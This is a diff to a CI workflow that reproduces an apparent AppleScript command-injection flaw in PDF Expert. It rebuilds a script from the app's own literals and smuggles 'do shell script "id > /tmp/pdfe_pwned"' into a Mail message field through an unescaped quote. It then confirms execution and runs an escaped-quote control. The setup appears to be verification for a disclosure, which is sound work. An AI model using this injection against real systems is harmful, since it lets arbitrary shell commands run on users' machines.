@@ -20,15 +20,19 @@ jobs:
           ls -l pex.zip
           shasum -a 256 pex.zip | tee zip.sha256
           unzip -q pex.zip -d app
-          ls -l "app/PDF Expert.app/Contents/MacOS/"
+          BIN="app/PDF Expert.app/Contents/MacOS/PDF Expert"
+          ls -l "$BIN"
 
-      - name: Re-derive the template literals from the shipped bytes
+      - name: Template literals present in the shipped bytes
         run: python3 poc/verify_binary.py "app/PDF Expert.app/Contents/MacOS/PDF Expert"
 
-      - name: Rebuild the exact script the app generates and tokenize it
-        run: python3 poc/gen_poc.py --cmd "id > /tmp/pdfe_pwned" --field body > generated.scpt
-             && cat generated.scpt
-             && python3 poc/verify_tokenlevel.py generated.scpt
+      - name: Rebuild the script from the binary's own literals, then tokenize
+        run: |
+          set -euo pipefail
+          python3 poc/gen_poc.py --binary "app/PDF Expert.app/Contents/MacOS/PDF Expert" \
+            --cmd "id > /tmp/pdfe_pwned" --field body > generated.scpt
+          echo "--- generated ---"; cat generated.scpt
+          python3 poc/verify_tokenlevel.py generated.scpt
 
       - name: Execute with the engine NSAppleScript drives
         run: |
@@ -42,14 +46,14 @@ jobs:
           echo "--- marker ---"; cat /tmp/pdfe_pwned 2>/dev/null
           if [ -s /tmp/pdfe_pwned ]; then echo "PROOF: do shell script executed"; else echo "NO PROOF"; fi
 
-      - name: Negative control (escape the quote, expect no execution)
+      - name: Negative control (escaped quote, expect no execution)
         run: |
           set +e
           rm -f /tmp/pdfe_ctl
           python3 - <<'PY' > ctl.scpt
           q = lambda v: '"' + v.replace('"', '\\"') + '"'
           print('tell application "Mail"')
-          print('set newMessage to make new outgoing message with properties {subject:' + q('x" & do shell script "id > /tmp/pdfe_ctl" & "') + '}')
+          print('set m to make new outgoing message with properties {subject:' + q('x" & do shell script "id > /tmp/pdfe_ctl" & "') + '}')
           print('end tell')
           PY
           cat ctl.scpt
@@ -58,13 +62,13 @@ jobs:
           for i in $(seq 1 10); do [ -s /tmp/pdfe_ctl ] && break; sleep 1; done
           kill $PID 2>/dev/null
           echo "--- control output ---"; cat ctl.out
-          if [ -s /tmp/pdfe_ctl ]; then echo "CONTROL FAILED (escaped payload still executed)"; else echo "CONTROL OK: escaped payload did not execute"; fi
+          if [ -s /tmp/pdfe_ctl ]; then echo "CONTROL FAILED"; else echo "CONTROL OK: escaped payload did not execute"; fi
 
       - name: Collect
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: pdfexpert-poc-evidence
+          name: evidence
           path: |
             generated.scpt
             ctl.scpt
